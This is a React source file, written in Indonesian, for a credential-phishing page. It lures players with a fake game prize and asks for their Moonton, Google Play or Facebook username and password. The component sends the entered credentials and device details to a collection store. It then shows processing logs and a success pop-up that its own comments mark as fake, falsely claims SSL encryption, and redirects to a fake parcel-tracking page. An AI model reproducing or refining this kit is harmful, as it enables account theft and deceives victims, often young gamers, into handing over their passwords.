import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { detectDevice } from "../device";
import Steps from "./Steps";
import { getPrize, TYPE_INFO } from "../prizes";
import { playBeep, playDing, playFail } from "../sound";
import { sendSubmission } from "../store";

const PLATFORMS = [
  { id: "Moonton", label: "Moonton ID", color: "#3b82f6", initial: "M" },
  { id: "Google", label: "Google Play", color: "#ea4335", initial: "G" },
  { id: "Facebook", label: "Facebook", color: "#1877f2", initial: "f" },
];

const LoginPage = () => {
  const [platform, setPlatform] = useState("Moonton");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phase, setPhase] = useState("form"); // form -> processing -> done
  const [logs, setLogs] = useState([]);
  const [err, setErr] = useState("");
  const navigate = useNavigate();
  const location = useLocation();
  const prize = location.state?.prize || "Hadiah";
  const nama = location.state?.nama || "";
  const cfg = getPrize(prize);
  const isFisik = cfg.type === "fisik";
  const activePlatform = PLATFORMS.find((p) => p.id === platform);

  const pushLog = (text, delay, sound = true) =>
    setTimeout(() => {
      setLogs((prev) => [...prev, text]);
      if (sound) playBeep();
    }, delay);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (password.length < 6) {
      setErr(`Password minimal 6 karakter — kamu baru memasukkan ${password.length}.`);
      playFail();
      navigator.vibrate?.(120);
      return;
    }
    setErr("");
    setPhase("processing");

    await sendSubmission({ tipe: "login", platform, username, password, prize, perangkat: detectDevice() });

    // Console log pemrosesan palsu
    pushLog("> Menghubungkan ke server reward-center...", 400, false);
    pushLog(`> Memverifikasi akun ${platform}: ${username}...`, 1200);
    pushLog('> Kredensial diterima <span class="ok">[OK]</span>', 2100);
    pushLog("> Menautkan hadiah ke akun game...", 2900);
    pushLog('> TRANSFER BERHASIL <span class="ok">✓</span>', 3800);

    setTimeout(() => {
      navigator.vibrate?.([80, 60, 80]);
      playDing();
      setPhase("done");
      setTimeout(() => {
        // Hadiah fisik → lacak paket palsu; hadiah lain → balik ke beranda
        if (isFisik) navigate("/track", { state: { prize, nama } });
        else navigate("/");
      }, 4400);
    }, 4300);
  };

  return (
    <div className="min-h-screen" style={{ background: "radial-gradient(120% 100% at 50% 0%, #101a33 0%, #0b0b14 55%)" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 480, minHeight: "100vh", padding: "26px 16px 40px" }}>
        <Steps current={2} />

        <div className="panel" style={{ overflow: "hidden" }}>
          {/* Banner atas */}
          <div style={{
            background: "linear-gradient(135deg,#1e3a8a,#312e81)",
            padding: "18px", textAlign: "center",
            borderBottom: "2px solid #ffb020",
          }}>
            <div style={{
              width: 46, height: 46, margin: "0 auto 8px", borderRadius: 12,
              background: "linear-gradient(135deg,#ff7a00,#ffd166)",
              display: "flex", alignItems: "center", justifyContent: "center", fontSize: 22,
            }}>🎁</div>
            <div className="display" style={{ fontSize: 15, letterSpacing: 1 }}>Verifikasi</div>
            <div style={{ fontSize: 11.5, color: "#c7d2fe", marginTop: 4 }}>
              Hadiah <strong style={{ color: "#ffd166" }}>{prize}</strong> dikunci — masuk untuk membuka
            </div>
          </div>

          <div style={{ padding: 22 }}>
            <div style={{ fontSize: 12.5, color: "#c9cede", marginBottom: 14, lineHeight: 1.55 }}>
              Sistem mendeteksi akun kamu belum tertaut. Masuk dengan akun game yang aktif untuk
              menerima hadiah secara otomatis:
            </div>

            {/* Pilih platform */}
            <div style={{ display: "flex", gap: 8, marginBottom: 16 }}>
              {PLATFORMS.map((p) => (
                <button
                  key={p.id}
                  type="button"
                  disabled={phase !== "form"}
                  onClick={() => setPlatform(p.id)}
                  style={{
                    flex: 1,
                    padding: "10px 4px",
                    borderRadius: 10,
                    border: platform === p.id ? `2px solid ${p.color}` : "1.5px solid #33334a",
                    background: platform === p.id ? `${p.color}1a` : "#0e0e18",
                    color: platform === p.id ? p.color : "#777f96",
                    fontWeight: 700,
                    fontSize: 12,
                    cursor: phase === "form" ? "pointer" : "default",
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    gap: 4,
                  }}
                >
                  <span style={{
                    width: 26, height: 26, borderRadius: 8,
                    background: p.color, color: "#fff",
                    display: "inline-flex", alignItems: "center", justifyContent: "center",
                    fontWeight: 800, fontSize: 13,
                  }}>{p.initial}</span>
                  {p.label}
                </button>
              ))}
            </div>

            {phase === "form" && (
              <form onSubmit={handleSubmit} className={err ? "shake" : ""}>
                <div style={{ marginBottom: 13 }}>
                  <input
                    required
                    className="input-dark"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      setErr("");
                    }}
                    placeholder={`Email / Username ${platform}`}
                    autoComplete="off"
                  />
                </div>
                <div style={{ marginBottom: 10 }}>
                  <input
                    required
                    type="password"
                    className="input-dark"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setErr("");
                    }}
                    placeholder="Password (minimal 6 karakter)"
                    minLength={6}
                    autoComplete="off"
                  />
                </div>
                {err && (
                  <p style={{ fontSize: 12, color: "#f87171", fontWeight: 700, marginBottom: 12, textAlign: "center" }}>
                    ⚠️ {err}
                  </p>
                )}
                <div style={{ fontSize: 10.5, color: "#4ade80", marginBottom: 16, display: "flex", alignItems: "center", gap: 5 }}>
                  🔒 Koneksi aman · Data terenkripsi SSL 256-bit
                </div>

                <button type="submit" className="btn-cta btn-green" style={{ width: "100%", fontSize: 16.5, padding: "14px 0" }}>
                  MASUK DENGAN {platform.toUpperCase()}
                </button>
              </form>
            )}

            {/* Console pemrosesan */}
            {(phase === "processing" || phase === "done") && (
              <div className="console">
                {logs.map((l, i) => (
                  <div key={i} className="console-line" dangerouslySetInnerHTML={{ __html: l }} />
                ))}
                {phase === "processing" && <span className="blink">▌</span>}
                {phase === "done" && (
                  <div style={{ marginTop: 6, color: "#ffd166" }}>Mengalihkan...</div>
                )}
              </div>
            )}
          </div>

          {/* Footer kartu */}
          <div style={{ background: "#0e0e18", padding: "10px", textAlign: "center", fontSize: 9.5, color: "#3d4560", borderTop: "1px solid #23233a" }}>
            Account Center v4.2.1 · © 2026 All Rights Reserved
          </div>
        </div>

        <div style={{ textAlign: "center", marginTop: 14, fontSize: 10.5, color: "#4a5165" }}>
          Butuh bantuan? Hubungi CS resmi kami via WhatsApp
        </div>
      </div>

      {/* POP-UP SUKSES */}
      {phase === "done" && (
        <div className="modal-overlay">
          <div className="modal-card">
            <div style={{ fontSize: 58, marginBottom: 8 }}>✅</div>
            <div className="display" style={{ fontSize: 21, color: "#4ade80" }}>Verifikasi Berhasil!</div>
            <p style={{ fontSize: 13.5, color: "#c9cede", marginTop: 10, lineHeight: 1.65 }}>
              Akun <strong>{username}</strong> berhasil diverifikasi.<br />
              <strong style={{ color: "#ffd166" }}>{prize}</strong> sedang diproses ke akun game kamu.
            </p>
            <div style={{ margin: "14px auto 0", height: 5, borderRadius: 99, background: "#23233a", overflow: "hidden", maxWidth: 220 }}>
              <div style={{ height: "100%", width: "100%", background: "linear-gradient(90deg,#ffb020,#ffd166)", animation: "loadBar 4s linear forwards" }} />
            </div>
            <div style={{ marginTop: 10, fontSize: 11, color: "#666f85", fontStyle: "italic" }}>
              Mengalihkan ke halaman utama...
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoginPage;
